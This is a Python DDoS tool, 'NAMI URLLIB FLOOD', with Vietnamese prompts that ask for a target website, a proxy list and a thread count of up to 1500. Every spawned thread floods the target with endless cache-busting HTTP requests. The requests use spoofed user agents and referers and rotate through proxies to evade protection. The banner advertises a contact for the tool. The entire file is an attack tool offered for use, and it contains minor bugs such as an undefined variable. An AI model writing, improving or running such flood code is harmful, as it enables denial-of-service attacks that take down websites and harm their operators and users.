import urllib.request, os, threading, time, random, sys
from sys import stdout

ref = [
    'https://duckduckgo.com/',
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yandex.ru/',
    'https://search.yahoo.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.youtube.com/'
]
useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",]
		
class Spammer(threading.Thread):
    def __init__(self, url, number, lista):
        threading.Thread.__init__(self)
        self.url = url + "?" + str(random.randint(0,999999)) + "=" + str(random.randint(0,999999))
        self.num = number
        self.headers = self.headers = {
                'User-Agent': random.choice(ua),
                'Referer': random.choice(ref),
                'Accept-Encoding': 'gzip;q=0,deflate;q=0',
                'Connection': 'Keep-Alive',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Cache-directive': 'no-cache',
                'Pragma': 'no-cache',
                'Upgrade-Insecure-Requests': '1',
            }
        self.Lock = threading.Lock()
        self.lista = lista
    def request(self):
        global N
        data = None
        if N >= (len(self.lista) - 1):
            N = 0
        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener) 
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        sys.stdout.write("Thread #%4d | %4d\%d | Proxy@%s"%(self.num, N, len(self.lista), self.lista[N]))
    def run(self):
        global N
        self.Lock.acquire()
        print ("Thread #%4d |"% (self.num))
        self.Lock.release()
        time.sleep(1)
        while True:
            try:
                N += 1
                self.request()
            except:
                pass
        sys.exit(0)
def title():
    stdout.write("                                                                                          \n")
    stdout.write("                   ""       (_)   (_)                  (_)                   \n")
    stdout.write("                   ""       (__)_ (_)  ____   __   __   _                   \n")
    stdout.write("                   ""       (_)(_)(_) (____) (__)_(__) (_)                \n")
    stdout.write("                   ""       (_)  (__)( )_( )(_) (_) (_)(_)                \n")
    stdout.write("                   ""       (_)   (_) (__)_)(_) (_) (_)(_)                \n")
    stdout.write("                   ""                                                \n")
    stdout.write("             "            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+"║             NAMI URLLIB FLOOD             ""          ║\n")
    stdout.write("             "+"║        ADDED NEW METHOD AND BYPASS    ""              ║\n")
    stdout.write("             "+"║        ZALO: https://zalo.me/0765698140   ""          ║\n")
    stdout.write("             "+"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
class MainLoop():
    
    def __init__(self):
        if os.name in ("nt", "dos", "ce"):
            title()
    def check_url(self, url):
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "https://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "https://" + url
        return url

    def setup(self):
        global Close, Request, Tot_req
        while True:        
            url = input('> Nhập link website muốn DDoS: ')
            url = self.check_url(url)
            try:
                req = urllib.request.Request(url, None, {'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36'})
                response = urllib.request.urlopen(req)
                break
            except:
                print ('> Không thể mở liên kết này do có anti hoặc sai link vui lòng check lại.')
        while True:            
            try:
                l = str(input('> Nhập file proxy mặc dịnh là proxy.txt: '))
                in_file = open(l,"r")
                lista = []
                for i in in_file:
                    lista.append(i.split("/n")[0])
                break
            except:
                print ('Lỗi đọc tệp tin vui lòng xem lại tên file.')
        while True:                
            try:
                num_threads = int(input('> Nhập sức mạnh tấn công bình thường [900] Max 1500: '))
            except:
                num_threads = 900
            break

        for i in range(num_threads):
            Spammer(url, i + 1, lista).start()
        
if __name__ == '__main__':
    N = 0
    b = MainLoop()
    b.setup()
